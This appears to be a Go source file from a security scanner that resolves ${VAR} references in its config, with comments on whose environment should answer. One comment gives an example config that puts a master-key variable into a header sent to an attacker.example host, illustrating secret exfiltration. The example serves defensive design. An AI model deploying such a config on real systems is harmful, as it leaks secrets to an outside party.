package config

import (
	"fmt"
	"os"
	"regexp"
	"sort"
	"strings"
)

// A DAST engine cannot test anything behind a login without a credential, and
// a credential cannot go in .dragon.yaml: the file is committed, and this
// tool's own secret scanner would flag it -- correctly, because a token in a
// repository is a disclosed token however good the reason.
//
// So the file names the variable and the environment carries the value.
//
//	engines:
//	  zap:
//	    rules: [https://staging.example.com/]
//	dast:
//	  headers:
//	    Authorization: "Bearer ${DAST_TOKEN}"
var envReference = regexp.MustCompile(`\$\{([A-Za-z_][A-Za-z0-9_]*)(:-([^}]*))?\}`)

// escapedDollar is how a literal "${" is written: "$${". Needed because a
// pattern or a message may legitimately contain one, and a config that cannot
// express its own syntax is a config with a trap in it.
const escapedDollar = "$${"

// Lookup resolves a variable reference. It is a parameter rather than a call to
// os.LookupEnv because whose environment answers is the whole security question.
//
// For `dragon scan` the answer is the process environment: the person running
// it wrote the config and owns the secrets, and reading their own shell is the
// point of the feature.
//
// For a server evaluating a configuration file out of a repository it did not
// write, the process environment is the worst possible answer. A scanner that
// resolves ${VAR} against its own environment hands any repository it can
// clone a read primitive over every secret the scanner holds -- and DAST
// config is an egress primitive in the same file, so the two compose into
// exfiltration with no exploit needed:
//
//	dast:
//	  headers:
//	    X-Data: "${ENCRYPTION_MASTER_KEY}"
//	engines:
//	  zap:
//	    rules: ["https://attacker.example/"]
//
// So the source is supplied by whoever is trusted to decide it, and a caller
// handling untrusted input supplies one that holds only what that input is
// entitled to see.
type Lookup func(name string) (string, bool)

// OSEnv resolves against the process environment. Correct for a CLI, wrong for
// a server reading somebody else's repository.
func OSEnv(name string) (string, bool) { return os.LookupEnv(name) }

// NoEnv resolves nothing. Every reference in the document is then reported as
// unset, which is the safe direction: a configuration that wanted a variable it
// may not have fails loudly instead of quietly being given one.
func NoEnv(string) (string, bool) { return "", false }

// interpolate replaces ${VAR} references using the supplied lookup.
//
// An unset variable with no default is an error, not an empty string. Empty
// would produce `Authorization: Bearer ` -- a header that is present, wrong,
// and indistinguishable from an authenticated scan until somebody reads the
// findings and wonders why everything behind the login looks clean. Leaving
// the reference in place is no better: it sends the literal "${DAST_TOKEN}".
//
// A project that genuinely wants an optional value says so with ${VAR:-} and
// means it.
func interpolate(raw []byte, lookup Lookup) ([]byte, error) {
	if lookup == nil {
		lookup = NoEnv
	}
	const placeholder = "\x00dragonguard-literal-dollar-brace\x00"
	text := strings.ReplaceAll(string(raw), escapedDollar, placeholder)

	missing := map[string]bool{}
	out := envReference.ReplaceAllStringFunc(text, func(ref string) string {
		m := envReference.FindStringSubmatch(ref)
		name, hasDefault, fallback := m[1], m[2] != "", m[3]

		if v, ok := lookup(name); ok && v != "" {
			return v
		}
		if hasDefault {
			return fallback
		}
		missing[name] = true
		return ref
	})

	if len(missing) > 0 {
		names := make([]string, 0, len(missing))
		for n := range missing {
			names = append(names, n)
		}
		sort.Strings(names)
		return nil, fmt.Errorf(
			"%s referenced by the configuration but not set in the environment "+
				"(write ${%s:-} if it is genuinely optional)",
			strings.Join(names, ", "), names[0])
	}

	return []byte(strings.ReplaceAll(out, placeholder, "${")), nil
}
